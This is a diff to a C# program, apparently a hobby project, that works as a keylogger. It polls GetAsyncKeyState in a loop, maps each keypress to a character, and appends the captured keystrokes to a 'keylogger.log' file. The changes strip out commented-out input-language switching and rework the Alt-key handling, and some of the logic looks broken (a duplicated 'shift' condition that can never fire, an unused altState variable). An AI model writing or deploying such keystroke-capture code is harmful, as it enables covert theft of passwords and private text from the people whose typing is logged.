@@ -9,18 +9,6 @@ namespace project_kan
         public static extern int GetAsyncKeyState(Int32 i);
         static void Main(String[] args)
         {
-            //lang control -> I have troubles with currentInputLanguage application
-
-            //string Text = "";
-            //InputLanguage myCurrentLanguage = InputLanguage.CurrentInputLanguage;
-            //Text = myCurrentLanguage.Culture.EnglishName;
-            //string text = Text;
-            //string nText;
-            //if (text == "English(United States") nText = "Russian (Russia)";
-            //else nText = "English (United States)";
-
-            //
-
             File.Delete("keylogger.log");
             string buf = "";
             while (true)
@@ -82,8 +70,8 @@ namespace project_kan
                                     else buf += "1";
                                     break;
                                 case "D2":
-                                    if (shift /*&& text == "English (United States)"*/) buf += "@";
-                                    else if (shift /*&& text == "Russian (Russia)"*/) buf += '"'; 
+                                    if (shift) buf += "@";
+                                    else if (shift) buf += '"';
                                     else buf += "2";
                                     break;
                                 case "D3":
@@ -118,7 +106,6 @@ namespace project_kan
                                     if (shift) buf += ")";
                                     else buf += "0";
                                     break;
-                                //+-
                                 case "Oemplus":
                                     if (shift) buf += "+";
                                     else buf += "=";
@@ -127,7 +114,6 @@ namespace project_kan
                                     if (shift) buf += "_";
                                     else buf += "-";
                                     break;
-                                //USA-layout
                                 case "Oem1":
                                     if (shift) buf += ":";
                                     else buf += ";";
@@ -164,40 +150,21 @@ namespace project_kan
                                     if (shift) buf += "|";
                                     else buf += '\\';
                                     break;
-                                //alt
-                                //!!!
-                                //!!!
-                                //!!!
                                 case "Menu":
-                                    File.AppendAllText("keylogger.log", "<alt>");
+                                    if (shift) buf += "<alt>";
                                     break;
                                 case "LMenu":
-                                    File.AppendAllText("keylogger.log", "<alt>");
+                                    if (shift) buf += "<alt>";
                                     break;
                                 case "RMenu":
-                                    File.AppendAllText("keylogger.log", "<alt>");
+                                    if (shift) buf += "<alt>";
                                     break;
-
-                                //case "LMenu":
-                                //    string temp = text;
-                                //    text = nText;
-                                //    nText = temp;
-                                //    break;
-                                //case "Menu":
-                                //    string temp1 = text;
-                                //    text = nText;
-                                //    nText = temp1;
-                                //    break;
-                                //case "RMenu":
-                                //    string temp2 = text;
-                                //    text = nText;
-                                //    nText = temp2;
-                                //    break;
                                 default:
                                     buf += $"<{((Keys)i).ToString()}>"; //more types
                                     break;
                             }
                         }
+                        short altState = (short)GetAsyncKeyState(164);
                         //every 10 symbols
                         if (buf.Length > 10)
                         {
